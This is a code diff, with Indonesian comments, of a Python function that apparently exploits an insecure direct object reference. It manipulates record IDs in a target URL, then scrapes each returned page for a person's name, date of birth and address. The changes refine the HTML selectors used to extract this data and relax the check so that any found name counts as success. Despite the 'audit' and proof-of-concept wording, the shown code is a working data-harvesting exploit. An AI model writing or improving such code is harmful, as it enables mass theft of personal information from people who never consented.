@@ -181,7 +181,7 @@ def parameter_discovery_audit():
                         continue
 
                     # 1. Tampilkan Target Awal (Masking digit ke-3 dari belakang)
-                    poc_mask = "*" * (len(original_id) - 2) + original_id[-1] + "**"
+                    poc_mask = "*" * (len(original_id) - 3) + original_id[-3] + "**"
                     print(f"\n[*] Target Selected: {base_url.replace(original_id, poc_mask)}")
                     
                     # 2. Automated Manipulation Test
@@ -204,18 +204,18 @@ def parameter_discovery_audit():
                         # Inisialisasi Data
                         name, dob, address = "Unknown", "Tidak Ditemukan", "Tidak Ditemukan"
                         
-                        # Ekstraksi Data secara Agresif
-                        for tag in test_soup.find_all(['p', 'td', 'li', 'span']):
-                            txt = tag.get_text(" ", strip=True)
-                            if ":" in txt:
-                                parts = txt.split(":", 1)
-                                key, val = parts[0].lower(), parts[1].strip()
-                                if "nama" in key: name = val
-                                elif "lahir" in key: dob = val
-                                elif "alamat" in key: address = val
+                        # Ekstraksi Data (Sesuai Logika Opsi 2 yang Berhasil)
+                        nama_tag = test_soup.find('p', class_='sale-price text-success')
+                        if nama_tag:
+                            name = nama_tag.get_text(strip=True)
+                            details = test_soup.find_all('p', class_='detail')
+                            for p in details:
+                                text = p.get_text(strip=True)
+                                if "Tgl. Lahir" in text: dob = text.split(":")[-1].strip()
+                                elif "Alamat" in text: address = text.split(":")[-1].strip()
                         
-                        # Validasi: Jika nama dan alamat ditemukan, hentikan pencarian
-                        if name != "Unknown" and address != "Tidak Ditemukan":
+                        # Validasi: Jika nama ditemukan, hentikan pencarian
+                        if name != "Unknown":
                             found_valid = True
                             result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
                             
